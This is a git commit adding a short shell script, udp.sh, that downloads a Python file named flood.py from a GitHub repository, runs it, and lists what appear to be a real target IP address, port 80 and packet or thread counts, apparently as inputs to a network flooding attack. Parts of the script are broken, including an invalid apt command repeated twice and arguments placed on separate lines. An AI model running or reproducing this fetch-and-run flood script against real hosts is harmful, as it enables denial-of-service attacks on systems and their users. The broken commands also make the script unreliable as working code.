d478d04bfa523a2b3f406e3b737ea8b87203a840
rak-art <138667029+rak-art@users.noreply.github.com>
2023-07-13 19:10:01 +0700

    Add files via upload

---
+++ udp.sh
@@ -0,0 +1,16 @@
+#!/bin/bash
+
+#update-upgrade
+sudo apt update-upgrade
+sudo apt update-upgrade
+sudo apt install wget
+
+#install
+wget https://raw.githubusercontent.com/rak-art/Ppppppppppverips/main/flood.py
+
+#Running
+python3 flood.py
+45.250.25.167
+80
+10000
+1000
